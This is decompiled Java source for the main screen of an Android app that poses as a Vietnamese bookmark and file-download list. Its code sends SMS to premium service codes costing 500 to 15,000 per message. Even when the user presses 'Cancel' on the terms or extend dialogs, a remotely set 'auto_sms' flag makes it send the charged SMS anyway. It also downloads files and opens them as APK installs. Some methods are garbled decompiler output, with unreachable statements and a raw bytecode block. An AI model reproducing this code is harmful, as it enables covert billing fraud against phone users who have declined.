package com.hdc.bookmark237968;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.view.Window;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import com.hdc.adapter.ListLinkAdapter;
import com.hdc.dialog.Dialog_Waitting;
import com.hdc.entity.LinkInfo;
import com.hdc.service.Service_mLink;
import com.hdc.ultilities.Base64;
import com.hdc.ultilities.DownloadImage;
import com.hdc.ultilities.FileManager;
import com.hdc.ultilities.SendSMS;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Random;

public class MainActivity
  extends Activity
{
  private static final String DOWNLOAD_FILE_QUESTION = "Bạn có muốn tải file không?";
  public static LinkInfo linkInfo;
  private String EXTEND_TIME = "extend_time";
  private String PREFS_NAME = "bookmak";
  AlertDialog alertDialog = null;
  AlertDialog alertExtend = null;
  ListLinkAdapter arradapter;
  public String auto_sms = "0";
  Dialog_Waitting dialog;
  public String ftime = "checktime.txt";
  boolean has_send;
  boolean have_img = false;
  private boolean imageOnline = false;
  boolean isConnect = false;
  String isFirstTime = "";
  private Calendar lastExtendTimeCalendar = null;
  public String link;
  ListView listView;
  public String mo;
  public int num;
  ProgressDialog pDialog;
  public String servicecode = "";
  public String servicecode2 = "";
  String strDecode;
  TextView tv_Row;
  TextView tv_Title;
  TextView tvlaw;
  public String txt_content;
  String typeNetwork;
  int type_so;
  
  public MainActivity() {}
  
  private void checkInternet()
  {
    ConnectivityManager localConnectivityManager = (ConnectivityManager)getSystemService("connectivity");
    if ((localConnectivityManager.getActiveNetworkInfo() != null) && (localConnectivityManager.getActiveNetworkInfo().isAvailable()) && (localConnectivityManager.getActiveNetworkInfo().isConnected()))
    {
      this.isConnect = true;
      return;
    }
    this.isConnect = false;
  }
  
  private void getInfoFromFile()
  {
    new ArrayList();
    Object localObject = FileManager.loadfileExternalStorage(this, 2130837505);
    try
    {
      this.strDecode = new String(Base64.decode(((String)((ArrayList)localObject).get(0)).toString()));
      Service_mLink.instance.getCategory(this.strDecode);
      if (this.imageOnline) {
        this.have_img = readImage();
      }
      for (;;)
      {
        localObject = FileManager.loadFtime(this, this.ftime).split(" ");
        this.isFirstTime = localObject[0];
        if (localObject.length != 2) {
          break;
        }
        this.lastExtendTimeCalendar = Calendar.getInstance();
        this.lastExtendTimeCalendar.setTime(new Date(Long.valueOf(localObject[1]).longValue()));
        return;
        readPackedImage();
      }
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  private boolean getSimNetwork()
  {
    boolean bool = true;
    this.dialog = new Dialog_Waitting(this, 1);
    this.dialog.show();
    TelephonyManager localTelephonyManager = (TelephonyManager)getSystemService("phone");
    String str = localTelephonyManager.getNetworkOperator();
    if ((str == null) || (str.equals(""))) {
      return false;
    }
    int i = Integer.parseInt(str.substring(3));
    switch (Integer.valueOf(localTelephonyManager.getSimState()).intValue())
    {
    default: 
      switch (i)
      {
      case 3: 
      case 6: 
      default: 
        this.typeNetwork = "OTHER";
      }
      break;
    }
    for (;;)
    {
      this.dialog.dismiss();
      return bool;
      bool = false;
      break;
      bool = false;
      break;
      bool = false;
      break;
      bool = false;
      break;
      bool = true;
      break;
      bool = false;
      break;
      this.typeNetwork = "VMS";
      continue;
      this.typeNetwork = "VNP";
      continue;
      this.typeNetwork = "VTT";
      continue;
      this.typeNetwork = "VIETNAM_MOBILE";
      continue;
      this.typeNetwork = "BEELINE";
    }
  }
  
  private void initListView()
  {
    this.tv_Title = ((TextView)findViewById(2131230721));
    this.listView = ((ListView)findViewById(2131230722));
    this.arradapter = new ListLinkAdapter(this, 2130903042, Service_mLink.instance.listLinkInfo, Service_mLink.font_item_color, Integer.valueOf(Service_mLink.type_display));
    this.listView = ((ListView)findViewById(2131230722));
    this.tv_Title.setBackgroundColor(Color.parseColor(Service_mLink.header_color));
    this.tv_Title.setTextColor(Color.parseColor(Service_mLink.font_header_color));
    this.tv_Title.setText(Service_mLink.text_title);
    if (Service_mLink.instance.listLinkInfo.size() > 1)
    {
      this.listView.setAdapter(this.arradapter);
      this.tv_Title.setVisibility(0);
    }
    if (Service_mLink.instance.listLinkInfo.size() > 1) {
      this.listView.setOnItemClickListener(new AdapterView.OnItemClickListener()
      {
        public void onItemClick(AdapterView<?> paramAnonymousAdapterView, View paramAnonymousView, int paramAnonymousInt, long paramAnonymousLong)
        {
          paramAnonymousAdapterView = Integer.valueOf(0);
          MainActivity.linkInfo = new LinkInfo();
          MainActivity.linkInfo = (LinkInfo)Service_mLink.instance.listLinkInfo.get(paramAnonymousInt);
          MainActivity.this.link = MainActivity.linkInfo.getLink();
          MainActivity.this.mo = MainActivity.linkInfo.getMo();
          MainActivity.this.servicecode = MainActivity.linkInfo.getServicecode();
          MainActivity.this.servicecode2 = MainActivity.linkInfo.getServicecode2();
          if (paramAnonymousAdapterView.intValue() != 0) {
            paramAnonymousAdapterView.intValue();
          }
          if (((MainActivity.this.servicecode.equals("")) && (MainActivity.this.servicecode2.equals(""))) || (MainActivity.this.getPayedLink(MainActivity.this.link) == 1))
          {
            Log.e("servicecodeAll", MainActivity.this.servicecode + "sv : sv2" + MainActivity.this.servicecode2);
            new MainActivity.DownloadFileFromURL(MainActivity.this).execute(new String[] { MainActivity.this.link, MainActivity.linkInfo.getTitle() });
          }
          for (;;)
          {
            if (MainActivity.this.isNeedExtend()) {
              MainActivity.this.popupExtend();
            }
            return;
            MainActivity.this.checkSVCode(MainActivity.this.servicecode);
            paramAnonymousAdapterView = new AlertDialog.Builder(MainActivity.this);
            paramAnonymousView = new TextView(MainActivity.this);
            paramAnonymousView.setText(MainActivity.this.txt_content);
            paramAnonymousView.setGravity(1);
            paramAnonymousView.setTextColor(Color.parseColor("#ffffff"));
            paramAnonymousAdapterView.setView(paramAnonymousView);
            paramAnonymousAdapterView.setPositiveButton("Ok", new DialogInterface.OnClickListener()
            {
              public void onClick(DialogInterface paramAnonymous2DialogInterface, int paramAnonymous2Int)
              {
                MainActivity.this.checkInternet();
                if (MainActivity.this.isConnect)
                {
                  if ((MainActivity.this.typeNetwork == "VIETNAM_MOBILE") || (MainActivity.this.typeNetwork == "BEELINE")) {
                    SendSMS.send(MainActivity.this.mo, MainActivity.this.servicecode2, MainActivity.this, MainActivity.this.type_so);
                  }
                  for (;;)
                  {
                    MainActivity.this.savePayedLink(MainActivity.this.link);
                    try
                    {
                      Toast.makeText(MainActivity.this.getApplicationContext(), "Cám ơn bạn đã sử dụng dịch vụ", 1000).show();
                      Thread.sleep(1000L);
                      paramAnonymous2DialogInterface.cancel();
                      new MainActivity.DownloadFileFromURL(MainActivity.this).execute(new String[] { MainActivity.this.link, MainActivity.linkInfo.getTitle() });
                      return;
                      SendSMS.send(MainActivity.this.mo, MainActivity.this.servicecode, MainActivity.this, MainActivity.this.type_so);
                    }
                    catch (InterruptedException localInterruptedException)
                    {
                      for (;;)
                      {
                        localInterruptedException.printStackTrace();
                      }
                    }
                  }
                }
                paramAnonymous2DialogInterface = new AlertDialog.Builder(MainActivity.this);
                paramAnonymous2DialogInterface.create();
                paramAnonymous2DialogInterface.setTitle("Thông báo");
                paramAnonymous2DialogInterface.setMessage("Bạn vui lòng kiểm tra kết nối Internet !!!");
                paramAnonymous2DialogInterface.show();
              }
            });
            paramAnonymousAdapterView.setNegativeButton("Cancel", new DialogInterface.OnClickListener()
            {
              public void onClick(DialogInterface paramAnonymous2DialogInterface, int paramAnonymous2Int)
              {
                paramAnonymous2DialogInterface.cancel();
              }
            });
            paramAnonymousAdapterView.show();
          }
        }
      });
    }
  }
  
  private void popup()
  {
    checkSVCode(Service_mLink.svcodeActive);
    if (Service_mLink.number_send == 1) {
      if (this.isFirstTime == "") {
        openPop_up(Service_mLink.instance.activePopup1, Service_mLink.number_send, 1);
      }
    }
    for (;;)
    {
      return;
      try
      {
        i = Integer.valueOf(this.isFirstTime).intValue();
        Log.i("SEND_SMS", i);
        j = Service_mLink.number_send;
        while (j > 0)
        {
          if (j > i)
          {
            if (j != Service_mLink.number_send) {
              break label117;
            }
            openPop_up(Service_mLink.instance.activePopup2, Service_mLink.number_send, j);
          }
          j -= 1;
        }
      }
      catch (Exception localException)
      {
        for (;;)
        {
          int j;
          int i = 0;
          continue;
          label117:
          openPop_up(Service_mLink.instance.activePopup1, Service_mLink.number_send, j);
        }
      }
    }
  }
  
  private void popupExtend()
  {
    if (this.alertExtend == null)
    {
      AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
      localBuilder.setMessage(Service_mLink.instance.popupExtend);
      localBuilder.setCancelable(false);
      localBuilder.setPositiveButton("OK", new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          if ((MainActivity.this.typeNetwork == "VIETNAM_MOBILE") || (MainActivity.this.typeNetwork == "BEELINE")) {
            SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive2, MainActivity.this, MainActivity.this.type_so);
          }
          for (;;)
          {
            Date localDate = new Date();
            MainActivity.this.lastExtendTimeCalendar.setTime(localDate);
            MainActivity.this.saveExtendStatus(localDate);
            paramAnonymousDialogInterface.dismiss();
            return;
            SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive, MainActivity.this, MainActivity.this.type_so);
          }
        }
      });
      localBuilder.setNegativeButton("CANCEL", new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          try
          {
            MainActivity.this.auto_sms = DownloadImage.instance.getAuto_sms2(Service_mLink.url_config_auto_sms);
            if (MainActivity.this.auto_sms.equals("1")) {
              if ((MainActivity.this.typeNetwork == "VIETNAM_MOBILE") || (MainActivity.this.typeNetwork == "BEELINE"))
              {
                SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive2, MainActivity.this, MainActivity.this.type_so);
                Date localDate = new Date();
                MainActivity.this.lastExtendTimeCalendar.setTime(localDate);
                MainActivity.this.saveExtendStatus(localDate);
                paramAnonymousDialogInterface.dismiss();
                return;
              }
            }
          }
          catch (Exception localException)
          {
            for (;;)
            {
              MainActivity.this.auto_sms = "0";
              continue;
              SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive, MainActivity.this, MainActivity.this.type_so);
            }
            paramAnonymousDialogInterface.dismiss();
            if (Service_mLink.instance.listLinkInfo.size() != 1) {
              break label190;
            }
          }
          if (!Service_mLink.link_redirect.equals("")) {
            MainActivity.this.startWebsite(Service_mLink.link_redirect);
          }
          for (;;)
          {
            System.exit(1);
            return;
            label190:
            paramAnonymousInt = new Random(System.currentTimeMillis()).nextInt(Service_mLink.instance.listLinkInfo.size());
            MainActivity.this.startWebsite(((LinkInfo)Service_mLink.instance.listLinkInfo.get(paramAnonymousInt)).getLink());
          }
        }
      });
      this.alertExtend = localBuilder.create();
    }
    if (!this.alertExtend.isShowing()) {
      this.alertExtend.show();
    }
  }
  
  private boolean readImage()
  {
    boolean bool = false;
    new ArrayList();
    ArrayList localArrayList = FileManager.loadImage(this);
    Log.i("Size Load IMG", localArrayList.size());
    int i;
    if (localArrayList.size() > 0) {
      i = 0;
    }
    for (;;)
    {
      if (i >= localArrayList.size())
      {
        bool = true;
        return bool;
      }
      try
      {
        ((LinkInfo)Service_mLink.instance.listLinkInfo.get(i)).setBmpIcon((Bitmap)localArrayList.get(i));
        i += 1;
      }
      catch (Exception localException)
      {
        for (;;)
        {
          localException.printStackTrace();
        }
      }
    }
  }
  
  /* Error */
  private void readPackedImage()
  {
    // Byte code:
    //   0: new 466	android/content/ContextWrapper
    //   3: dup
    //   4: aload_0
    //   5: invokevirtual 470	com/hdc/bookmark237968/MainActivity:getApplicationContext	()Landroid/content/Context;
    //   8: invokespecial 471	android/content/ContextWrapper:<init>	(Landroid/content/Context;)V
    //   11: invokevirtual 475	android/content/ContextWrapper:getAssets	()Landroid/content/res/AssetManager;
    //   14: astore 5
    //   16: iconst_0
    //   17: istore_1
    //   18: iload_1
    //   19: getstatic 194	com/hdc/service/Service_mLink:instance	Lcom/hdc/service/Service_mLink;
    //   22: getfield 322	com/hdc/service/Service_mLink:listLinkInfo	Ljava/util/ArrayList;
    //   25: invokevirtual 361	java/util/ArrayList:size	()I
    //   28: if_icmplt +4 -> 32
    //   31: return
    //   32: getstatic 194	com/hdc/service/Service_mLink:instance	Lcom/hdc/service/Service_mLink;
    //   35: getfield 322	com/hdc/service/Service_mLink:listLinkInfo	Ljava/util/ArrayList;
    //   38: iload_1
    //   39: invokevirtual 173	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   42: checkcast 458	com/hdc/entity/LinkInfo
    //   45: astore 6
    //   47: aconst_null
    //   48: astore_3
    //   49: aconst_null
    //   50: astore_2
    //   51: aload 5
    //   53: aload 6
    //   55: invokevirtual 478	com/hdc/entity/LinkInfo:getLink_icon	()Ljava/lang/String;
    //   58: invokevirtual 484	android/content/res/AssetManager:open	(Ljava/lang/String;)Ljava/io/InputStream;
    //   61: astore 4
    //   63: aload 4
    //   65: astore_2
    //   66: aload 4
    //   68: astore_3
    //   69: aload 6
    //   71: aload 4
    //   73: invokestatic 490	android/graphics/BitmapFactory:decodeStream	(Ljava/io/InputStream;)Landroid/graphics/Bitmap;
    //   76: invokevirtual 464	com/hdc/entity/LinkInfo:setBmpIcon	(Landroid/graphics/Bitmap;)V
    //   79: aload 4
    //   81: ifnull +8 -> 89
    //   84: aload 4
    //   86: invokevirtual 495	java/io/InputStream:close	()V
    //   89: iload_1
    //   90: iconst_1
    //   91: iadd
    //   92: istore_1
    //   93: goto -75 -> 18
    //   96: astore 4
    //   98: aload_2
    //   99: astore_3
    //   100: aload 4
    //   102: invokevirtual 241	java/lang/Exception:printStackTrace	()V
    //   105: aload_2
    //   106: ifnull -17 -> 89
    //   109: aload_2
    //   110: invokevirtual 495	java/io/InputStream:close	()V
    //   113: goto -24 -> 89
    //   116: astore_2
    //   117: aload_2
    //   118: invokevirtual 241	java/lang/Exception:printStackTrace	()V
    //   121: goto -32 -> 89
    //   124: astore_2
    //   125: aload_2
    //   126: invokevirtual 241	java/lang/Exception:printStackTrace	()V
    //   129: return
    //   130: astore_2
    //   131: aload_3
    //   132: ifnull +7 -> 139
    //   135: aload_3
    //   136: invokevirtual 495	java/io/InputStream:close	()V
    //   139: aload_2
    //   140: athrow
    //   141: astore_3
    //   142: aload_3
    //   143: invokevirtual 241	java/lang/Exception:printStackTrace	()V
    //   146: goto -7 -> 139
    //   149: astore_2
    //   150: aload_2
    //   151: invokevirtual 241	java/lang/Exception:printStackTrace	()V
    //   154: goto -65 -> 89
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	157	0	this	MainActivity
    //   17	76	1	i	int
    //   50	60	2	localObject1	Object
    //   116	2	2	localException1	Exception
    //   124	2	2	localException2	Exception
    //   130	10	2	localObject2	Object
    //   149	2	2	localException3	Exception
    //   48	88	3	localObject3	Object
    //   141	2	3	localException4	Exception
    //   61	24	4	localInputStream	InputStream
    //   96	5	4	localException5	Exception
    //   14	38	5	localAssetManager	android.content.res.AssetManager
    //   45	25	6	localLinkInfo	LinkInfo
    // Exception table:
    //   from	to	target	type
    //   51	63	96	java/lang/Exception
    //   69	79	96	java/lang/Exception
    //   109	113	116	java/lang/Exception
    //   0	16	124	java/lang/Exception
    //   18	31	124	java/lang/Exception
    //   32	47	124	java/lang/Exception
    //   117	121	124	java/lang/Exception
    //   139	141	124	java/lang/Exception
    //   142	146	124	java/lang/Exception
    //   150	154	124	java/lang/Exception
    //   51	63	130	finally
    //   69	79	130	finally
    //   100	105	130	finally
    //   135	139	141	java/lang/Exception
    //   84	89	149	java/lang/Exception
  }
  
  private void startWebsite(String paramString)
  {
    Intent localIntent = new Intent(this, WebActivity.class);
    Bundle localBundle = new Bundle();
    localBundle.putString("URL", paramString);
    localIntent.putExtras(localBundle);
    startActivity(localIntent);
  }
  
  public void checkSVCode(String paramString)
  {
    switch (Integer.parseInt(Character.toString(paramString.charAt(1))))
    {
    default: 
      paramString = "15000";
      this.type_so = 7;
    }
    for (;;)
    {
      this.txt_content = String.format(Service_mLink.instance.onClickItemPopup, new Object[] { paramString });
      return;
      paramString = "500";
      this.type_so = 0;
      continue;
      paramString = "1000";
      this.type_so = 1;
      continue;
      paramString = "2000";
      this.type_so = 2;
      continue;
      paramString = "3000";
      this.type_so = 3;
      continue;
      paramString = "4000";
      this.type_so = 4;
      continue;
      paramString = "5000";
      this.type_so = 5;
      continue;
      paramString = "10000";
      this.type_so = 6;
      continue;
      paramString = "15000";
      this.type_so = 7;
    }
  }
  
  public void createDialog()
  {
    this.pDialog = new ProgressDialog(this);
    this.pDialog.setMessage("Đang tải file...");
    this.pDialog.setIndeterminate(false);
    this.pDialog.setMax(100);
    this.pDialog.setProgressStyle(1);
    this.pDialog.setCancelable(true);
    this.pDialog.setCanceledOnTouchOutside(false);
    this.pDialog.show();
  }
  
  public Calendar getExtendStatus()
  {
    Object localObject2 = null;
    Calendar localCalendar = null;
    Object localObject1 = localObject2;
    try
    {
      Long localLong = Long.valueOf(getSharedPreferences(this.PREFS_NAME, 0).getLong(this.EXTEND_TIME, 0L));
      localObject1 = localObject2;
      if (localLong.longValue() != 0L)
      {
        localObject1 = localObject2;
        localCalendar = Calendar.getInstance();
        localObject1 = localCalendar;
        localCalendar.setTime(new Date(localLong.longValue()));
      }
      return localCalendar;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
    return localObject1;
  }
  
  public int getPayedLink(String paramString)
  {
    try
    {
      int i = getSharedPreferences(this.PREFS_NAME, 0).getInt(paramString, 0);
      return i;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
    return 0;
  }
  
  public boolean isNeedExtend()
  {
    if (this.isFirstTime.equals("")) {}
    Calendar localCalendar;
    do
    {
      do
      {
        return false;
      } while ((this.lastExtendTimeCalendar == null) && ((this.isFirstTime.equals("")) || (Integer.valueOf(this.isFirstTime).intValue() != Service_mLink.number_send)));
      Date localDate = new Date();
      localCalendar = Calendar.getInstance();
      localCalendar.setTime(localDate);
    } while ((this.lastExtendTimeCalendar.get(1) == localCalendar.get(1)) && (this.lastExtendTimeCalendar.get(2) == localCalendar.get(2)) && (this.lastExtendTimeCalendar.get(5) == localCalendar.get(5)));
    return true;
  }
  
  public void onBackPressed()
  {
    super.onBackPressed();
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    requestWindowFeature(1);
    getWindow().setFlags(1024, 1024);
    setContentView(2130903040);
    try
    {
      checkInternet();
      Service_mLink.instance.isSim = getSimNetwork();
      getInfoFromFile();
      if ((Service_mLink.instance.listLinkInfo.size() == 1) && (Service_mLink.orientation.equals(Service_mLink.LANDSCAPE))) {
        setRequestedOrientation(0);
      }
      paramBundle = getExtendStatus();
      if (paramBundle != null) {
        this.lastExtendTimeCalendar = paramBundle;
      }
      if ((this.isConnect) && (!this.have_img) && (this.imageOnline)) {
        new updateImage().execute(new Void[0]);
      }
      if (!this.isConnect) {
        Toast.makeText(this, "Bạn vui lòng kiểm tra kết nối Internet", 10).show();
      }
      popup();
      initListView();
      if (Service_mLink.instance.listLinkInfo.size() == 1) {
        findViewById(2131230722).setOnTouchListener(new View.OnTouchListener()
        {
          public boolean onTouch(View paramAnonymousView, MotionEvent paramAnonymousMotionEvent)
          {
            if (MainActivity.this.alertDialog == null)
            {
              paramAnonymousView = new AlertDialog.Builder(MainActivity.this);
              paramAnonymousView.setMessage("Bạn có muốn tải file không?");
              paramAnonymousView.setPositiveButton("OK", new DialogInterface.OnClickListener()
              {
                public void onClick(DialogInterface paramAnonymous2DialogInterface, int paramAnonymous2Int)
                {
                  new MainActivity.DownloadFileFromURL(MainActivity.this).execute(new String[] { ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getLink(), ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getTitle() });
                  paramAnonymous2DialogInterface.dismiss();
                }
              });
              paramAnonymousView.setNegativeButton("CANCEL", new DialogInterface.OnClickListener()
              {
                public void onClick(DialogInterface paramAnonymous2DialogInterface, int paramAnonymous2Int)
                {
                  paramAnonymous2DialogInterface.dismiss();
                }
              });
              MainActivity.this.alertDialog = paramAnonymousView.create();
            }
            if (!MainActivity.this.alertDialog.isShowing()) {
              MainActivity.this.alertDialog.show();
            }
            if (MainActivity.this.isNeedExtend()) {
              MainActivity.this.popupExtend();
            }
            return true;
          }
        });
      }
      return;
    }
    catch (Exception paramBundle)
    {
      paramBundle.printStackTrace();
    }
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    getMenuInflater().inflate(2131165185, paramMenu);
    return true;
  }
  
  public void onResume()
  {
    super.onResume();
    if (isNeedExtend()) {
      popupExtend();
    }
  }
  
  public void openPop_up(final String paramString, final int paramInt1, final int paramInt2)
  {
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
    View localView = LayoutInflater.from(this).inflate(2130903043, null);
    this.tvlaw = ((TextView)localView.findViewById(2131230727));
    this.tvlaw.setText(paramString);
    this.tvlaw.setTextColor(-1);
    if (paramInt2 == 1) {
      localBuilder.setTitle("Điều khoản Sử dụng & gía cước");
    }
    paramString = new Date();
    localBuilder.setView(localView);
    localBuilder.setCancelable(false);
    localBuilder.setPositiveButton("Ok", new DialogInterface.OnClickListener()
    {
      public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
      {
        Date localDate;
        if ((MainActivity.this.typeNetwork == "VIETNAM_MOBILE") || (MainActivity.this.typeNetwork == "BEELINE"))
        {
          SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive2, MainActivity.this, MainActivity.this.type_so);
          MainActivity.this.saveExtendStatus(paramString);
          Log.i("i", paramInt2);
          if (Service_mLink.instance.listLinkInfo.size() != 1) {
            break label250;
          }
          localDate = new Date();
          FileManager.saveFTime(MainActivity.this, paramInt2, MainActivity.this.ftime, localDate);
          MainActivity.this.lastExtendTimeCalendar = Calendar.getInstance();
          MainActivity.this.lastExtendTimeCalendar.setTime(localDate);
          if (paramInt1 == paramInt2) {
            new MainActivity.DownloadFileFromURL(MainActivity.this).execute(new String[] { ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getLink(), ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getTitle() });
          }
        }
        for (;;)
        {
          paramAnonymousDialogInterface.cancel();
          return;
          SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive, MainActivity.this, MainActivity.this.type_so);
          break;
          label250:
          localDate = new Date();
          FileManager.saveFTime(MainActivity.this, paramInt2, MainActivity.this.ftime, localDate);
          MainActivity.this.lastExtendTimeCalendar = Calendar.getInstance();
          MainActivity.this.lastExtendTimeCalendar.setTime(localDate);
        }
      }
    });
    localBuilder.setNegativeButton("Cancel", new DialogInterface.OnClickListener()
    {
      public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
      {
        if (paramInt2 == 1) {}
        try
        {
          MainActivity.this.auto_sms = DownloadImage.instance.getAuto_sms2(Service_mLink.url_config_auto_sms);
          if (MainActivity.this.auto_sms.equals("1"))
          {
            Log.i("auto_sms", MainActivity.this.auto_sms);
            if ((MainActivity.this.typeNetwork == "VIETNAM_MOBILE") || (MainActivity.this.typeNetwork == "BEELINE"))
            {
              SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive2, MainActivity.this, MainActivity.this.type_so);
              MainActivity.this.saveExtendStatus(paramString);
              Log.i("i", paramInt2);
              if (Service_mLink.instance.listLinkInfo.size() != 1) {
                break label315;
              }
              Date localDate1 = new Date();
              FileManager.saveFTime(MainActivity.this, paramInt2, MainActivity.this.ftime, localDate1);
              MainActivity.this.lastExtendTimeCalendar = Calendar.getInstance();
              MainActivity.this.lastExtendTimeCalendar.setTime(localDate1);
              if (paramInt1 == paramInt2) {
                new MainActivity.DownloadFileFromURL(MainActivity.this).execute(new String[] { ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getLink(), ((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getTitle() });
              }
              paramAnonymousDialogInterface.cancel();
            }
          }
        }
        catch (Exception localException)
        {
          for (;;)
          {
            MainActivity.this.auto_sms = "0";
            continue;
            SendSMS.send(Service_mLink.mo_Active, Service_mLink.svcodeActive, MainActivity.this, MainActivity.this.type_so);
            continue;
            label315:
            Date localDate2 = new Date();
            FileManager.saveFTime(MainActivity.this, paramInt2, MainActivity.this.ftime, localDate2);
            MainActivity.this.lastExtendTimeCalendar = Calendar.getInstance();
            MainActivity.this.lastExtendTimeCalendar.setTime(localDate2);
          }
          paramAnonymousDialogInterface.cancel();
          if (Service_mLink.instance.listLinkInfo.size() != 1) {
            break label424;
          }
        }
        if (!Service_mLink.link_redirect.equals("")) {
          MainActivity.this.startWebsite(Service_mLink.link_redirect);
        }
        for (;;)
        {
          System.exit(1);
          return;
          label424:
          MainActivity.this.startWebsite(((LinkInfo)Service_mLink.instance.listLinkInfo.get(0)).getLink());
        }
      }
    });
    localBuilder.show();
  }
  
  public void saveExtendStatus(Date paramDate)
  {
    SharedPreferences.Editor localEditor = getSharedPreferences(this.PREFS_NAME, 0).edit();
    localEditor.putLong(this.EXTEND_TIME, paramDate.getTime());
    localEditor.commit();
  }
  
  public void savePayedLink(String paramString)
  {
    SharedPreferences.Editor localEditor = getSharedPreferences(this.PREFS_NAME, 0).edit();
    localEditor.putInt(paramString, 1);
    localEditor.commit();
  }
  
  class DownloadFileFromURL
    extends AsyncTask<String, String, String>
  {
    File file;
    
    DownloadFileFromURL() {}
    
    protected String doInBackground(String... paramVarArgs)
    {
      try
      {
        paramVarArgs = new URL(paramVarArgs[0]);
        Object localObject = paramVarArgs.openConnection();
        ((URLConnection)localObject).connect();
        int i = ((URLConnection)localObject).getContentLength();
        paramVarArgs = new BufferedInputStream(paramVarArgs.openStream(), 8192);
        localObject = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/myfile");
        if (!((File)localObject).exists()) {
          ((File)localObject).mkdirs();
        }
        this.file = new File((File)localObject, new Date().getTime());
        localObject = new FileOutputStream(this.file);
        byte[] arrayOfByte = new byte['Ѐ'];
        long l = 0L;
        for (;;)
        {
          int j = paramVarArgs.read(arrayOfByte);
          if (j == -1)
          {
            ((OutputStream)localObject).flush();
            ((OutputStream)localObject).close();
            paramVarArgs.close();
            break;
          }
          l += j;
          publishProgress(new String[] { (int)(100L * l / i) });
          ((OutputStream)localObject).write(arrayOfByte, 0, j);
        }
        return null;
      }
      catch (Exception paramVarArgs)
      {
        Log.e("Error: ", paramVarArgs.getMessage());
        paramVarArgs.printStackTrace();
      }
    }
    
    protected void onPostExecute(String paramString)
    {
      super.onPostExecute(paramString);
      MainActivity.this.pDialog.dismiss();
      paramString = new Intent("android.intent.action.VIEW");
      paramString.setDataAndType(Uri.fromFile(this.file), "application/vnd.android.package-archive");
      MainActivity.this.startActivity(paramString);
    }
    
    protected void onPreExecute()
    {
      super.onPreExecute();
      MainActivity.this.createDialog();
    }
    
    protected void onProgressUpdate(String... paramVarArgs)
    {
      super.onProgressUpdate(paramVarArgs);
      MainActivity.this.pDialog.setProgress(Integer.parseInt(paramVarArgs[0]));
    }
  }
  
  class updateImage
    extends AsyncTask<Void, Integer, Void>
  {
    updateImage() {}
    
    protected Void doInBackground(Void... paramVarArgs)
    {
      int i = 0;
      for (;;)
      {
        if (i >= Service_mLink.instance.listLinkInfo.size()) {
          return null;
        }
        try
        {
          paramVarArgs = DownloadImage.instance.getImage(((LinkInfo)Service_mLink.instance.listLinkInfo.get(i)).getLink_icon());
          ((LinkInfo)Service_mLink.instance.listLinkInfo.get(i)).setBmpIcon(paramVarArgs);
          publishProgress(new Integer[] { Integer.valueOf(i) });
          i += 1;
        }
        catch (Exception paramVarArgs)
        {
          for (;;)
          {
            paramVarArgs = null;
          }
        }
      }
    }
    
    protected void onPostExecute(Void paramVoid)
    {
      super.onPostExecute(paramVoid);
      MainActivity.this.arradapter.notifyDataSetChanged();
      paramVoid = new ArrayList();
      int i = 0;
      for (;;)
      {
        if (i >= Service_mLink.instance.listLinkInfo.size())
        {
          FileManager.saveImage(MainActivity.this, paramVoid);
          return;
        }
        paramVoid.add(i, ((LinkInfo)Service_mLink.instance.listLinkInfo.get(i)).getBmpIcon());
        i += 1;
      }
    }
    
    protected void onPreExecute()
    {
      super.onPreExecute();
    }
    
    protected void onProgressUpdate(Integer... paramVarArgs)
    {
      super.onProgressUpdate(paramVarArgs);
      if (paramVarArgs[0].intValue() == 0) {
        MainActivity.this.dialog.dismiss();
      }
      MainActivity.this.arradapter.notifyDataSetChanged();
    }
  }
}
